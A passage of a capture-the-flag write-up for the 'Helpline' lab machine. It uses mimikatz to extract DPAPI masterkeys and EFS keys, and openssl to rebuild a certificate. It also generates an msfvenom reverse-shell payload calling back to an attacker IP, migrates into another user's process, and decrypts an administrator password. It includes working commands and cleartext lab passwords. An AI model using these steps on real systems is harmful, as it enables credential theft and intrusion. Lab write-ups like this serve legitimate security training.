+    algCrypt         : 00006610 - 26128 (CALG_AES_256)
+    pbKey            : 9dd4c16fe8fc2375858f5fdc643770d26bd55c48fec169c28d901820ebe28ea0d6845d2867e3a2bb3b763108da7fb69b5203d8a73ffb22b44d21949150546a0387e2a7d05a18b877f06d0dfe8baf89fc4029070bd5f0a5ac9cbe2379dda7facf6a2455ed8dae4dacd51b981b147ebddf12da71d4b22d675925ed576d92247aac8a39eb5080607382ecf2c3e9ea92ce2f
+
+[backupkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : bce3d5c5463ff84017a1f9eabfb4b9ea
+    rounds           : 00001f40 - 8000
+    algHash          : 0000800e - 32782 (CALG_SHA_512)
+    algCrypt         : 00006610 - 26128 (CALG_AES_256)
+    pbKey            : 6d4e0478c22d0a52f7bc66249a0c6a7071991300dd122c4bee0aa31b72273938f336a44d08a15a2effcb2e5787069ab153e666dcd518b7af23e168577f56739f68c42e057508d7d5ffb16bf18d9e720873e644152d461d83356f500f4b8efbbcc9ee073a718134111f8b2708bf0f1645
+
+[credhist]
+  **CREDHIST INFO**
+    dwVersion        : 00000003 - 3
+    guid             : {0cc50e66-d2f0-43dc-97a5-5edac908aef9}
+
+
+Auto SID from path seems to be: S-1-5-21-3107372852-1132949149-763516304-1011
+
+[masterkey] with password: !zaq1234567890pl!99 (normal user)
+  key : 1d0cea3fd8c42574c1a286e3938e6038d3ed370969317fb413b339f8699dcbf7f563b42b72ef45b394c61f73cc90c62076ea847f4c1e1fee3947f381d56d0f02
+  sha1: 8ece5985210c26ecf3dd9c53a38fc58478100ccb
+===============================================================================================================================
+
+We now have the master key extracted, we need the private key set
+
+Commands and Output:
+===============================================================================================================================
+cd C:\users\tolu\Appdata\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011
+cat 307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85
+===============================================================================================================================
+
+Commands and Output:
+===============================================================================================================================
+./mimikatz "dpapi::capi /in:C:\users\tolu\Appdata\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011/307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85 /masterkey:8ece5985210c26ecf3dd9c53a38fc58478100ccb" "exit"
+
+#### And we got a new file
+	|Provider name : Microsoft Strong Cryptographic Provider
+	|Unique name   : 
+	|Implementation: CRYPT_IMPL_SOFTWARE ; 
+	Algorithm      : CALG_RSA_KEYX
+	Key size       : 2048 (0x00000800)
+	Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
+	Exportable key : YES
+	Private export : OK - 'dpapi_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.keyx.rsa.pvk'
+===============================================================================================================================
+
+Commands and Output:
+===============================================================================================================================
+copy  dpapi_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.keyx.rsa.pvk t:
+
+#### On the attacker machine
+openssl x509 -inform DER -outform PEM -in 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der -out public.pem
+openssl rsa -inform PVK -outform PEM -in dpapi_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.keyx.rsa.pvk -out private.pem
+openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+===============================================================================================================================
+
+Commands and Output:
+===============================================================================================================================
+copy dpapi_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.keyx.rsa.pvk t: 
+cd t:
+ls
+
+
+    Directory: t:\
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----         4/8/2021   1:26 AM            765 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der                          
+-a----         4/8/2021   3:00 AM             41 masterkey-sha1.txt                                                    
+-a----       12/29/2018   9:21 PM           2249 307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85 
+-a----         4/8/2021   2:15 AM           1196 dpapi_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.keyx.rsa.pv
+                                                 k                                                                     
+-a----         4/8/2021   3:21 AM           1090 public.pem                                                            
+-a----         4/8/2021   3:21 AM           1675 private.pem                                                           
+-a----         4/8/2021   3:22 AM           2491 cert.pfx                                                              
+
+
+certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot
+Certificate "tolu" added to store.
+
+CertUtil: -importPFX command completed successfully.
+cd c:\users\tolu\Desktop
+$file = gc user.txt
+$file.substring(0,15) 
+0d522fa8d6d2671
+
+===============================================================================================================================
+
+Now we can read the flag no issues. For the administrator we can go to leos directory which contains the admin-pass.xml
+
+Commands and Output:
+===============================================================================================================================
+PS C:\users\leo\Desktop> 
+
+    Directory: C:\users\leo\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        1/15/2019  12:18 AM            526 admin-pass.xml
+
+type admin-pass.xml
+PS C:\users\leo\Desktop> type : Access to the path 'C:\users\leo\Desktop\admin-pass.xml' is denied.
+At line:1 char:1
++ type admin-pass.xml
++ ~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\users\leo\Desktop\admin-pass.xml:String) [Get-Content], Unauthoriz 
+   edAccessException
+    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+
+===============================================================================================================================
+
+Still can't read it so the next best thing is to jump to a process that leo has currently up and running
+Commands and Output:
+===============================================================================================================================
+cipher /c admin-pass.xml
+
+ Listing C:\users\leo\Desktop\
+ New files added to this directory will not be encrypted.
+
+E admin-pass.xml
+  Compatibility Level:
+    Windows XP/Server 2003
+
+  Users who can decrypt:
+    HELPLINE\leo [leo(leo@HELPLINE)]
+    Certificate thumbprint: 66E4 033A 6EEE 1414 7D7D 9F97 6E5C D1D5 20B0 24B8 
+
+  No recovery certificate found.
+
+  Key information cannot be retrieved.
+===============================================================================================================================
+
+Commands and Output:
+===============================================================================================================================
+tasklist /v 
+....
+...
+..
+          0:00:00 N/A                                                                     
+explorer.exe                  5240 Console                    1     79,512 K Unknown         HELPLINE\leo                                            0:00:10 N/A                                                                     
+ShellExperienceHost.exe       5788 Console                    1     44,872 K Unknown         HELPLINE\leo                                            0:00:00 N/A                                                                     
+SearchUI.exe                  5872 Console                    1     49,412 K Unknown         HELPLINE\leo                                            0:00:02 N/A                                                                     
+RuntimeBroker.exe             6036 Console                    1     31,244 K Unknown         HELPLINE\leo                                            0:00:03 N/A                                                                     
+RuntimeBroker.exe             1308 Console                    1     12,416 K Unknown         HELPLINE\leo                                            0:00:00 N/A                                                                     
+vmtoolsd.exe                  5572 Console                    1     16,356 K Unknown         HELPLINE\leo                                            0:00:35 N/A                                                                     
+powershell.exe                2636 Console                    1     83,752 K Unknown         HELPLINE\leo                                            0:00:16 N/A                                                                     
+conhost.exe                   2876 Console                    1     19,980 K Unknown         HELPLINE\leo                                            0:00:02 N/A                                                                     
+RuntimeBroker.exe              908 Console                    1     16,660 K Unknown         HELPLINE\leo                                            0:00:00 N/A                                                                     
+....
+....
+
+===============================================================================================================================
+
+We can jump into any of leos processes and hijack his session. First we create a msfvenom payload, then we copy the executable to
+the victim machine and then we execute it, wait for the callback and afterwards switch into leos process.
+
+Command and Output:
+===============================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/helpline/smb]
+└──╼ $msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4500 -f exe -o msf.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: msf.exe
+
+msf6 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set lhost tun0
+lhost => 10.10.14.23
+msf6 exploit(multi/handler) > set lport 4500
+lport => 4500
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.23:4500 
+[*] Sending stage (200262 bytes) to 10.10.10.132
+[*] Meterpreter session 1 opened (10.10.14.23:4500 -> 10.10.10.132:49867) at 2021-04-07 19:43:35 -0700
+
+meterpreter > whoami
+
+===============================================================================================================================
+
+Command and Output:
+===============================================================================================================================
+meterpreter > migrate 5240
+meterpreter > cd c:/Users/leo
+meterpreter > cd Desktop
+meterpreter > cat admin-pass.xml 
+01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa
+===============================================================================================================================
+
+Now we have the secure string we can use to find the clear text password through the following:
+Command and Output:
+===============================================================================================================================
+PS > $pw = gc admin-pass.xml | convertto-securestring
+PS > $pw
+System.Security.SecureString
+PS > $cred = new-object system.management.automation.pscredential("administrator", $pw)
+PS > $cred.getnetworkcredential()
+
+UserName                                           Domain
+-administrator
+
+
+PS > $cred.getnetworkcredential() | fl *
+
+
+UserName       : administrator
+Password       : mb@letmein@SERVER#acc
+SecurePassword : System.Security.SecureString
+Domain         :
+
+===============================================================================================================================
+
+We can repeat the same process for efs for adminsitrator or invoke command since we already have password for administrator.
+
+Command and Output:
+===============================================================================================================================
+Invoke-Command -ComputerName helpline -credential $cred -Authentication CredSSP -ScriptBlock { $file = gc c:\Users\administrator\Desktop\root.txt; $file.substring(0,15)}
+ERROR: Attempting to perform the InitializeDefaultDrives operation on the 'FileSystem' provider failed.
+d814211fc0538e5
+PS > Invoke-Command -ComputerName helpline -credential $cred -Authentication CredSSP -ScriptBlock { gc c:\Users\administrator\Desktop\root.txt}
+ERROR: Attempting to perform the InitializeDefaultDrives operation on the 'FileSystem' provider failed.
+d814211fc0538e50
+===============================================================================================================================
+
+DONE
+
+Command and Output:
+===============================================================================================================================
+===============================================================================================================================
+
+Command and Output:
+===============================================================================================================================
+===============================================================================================================================
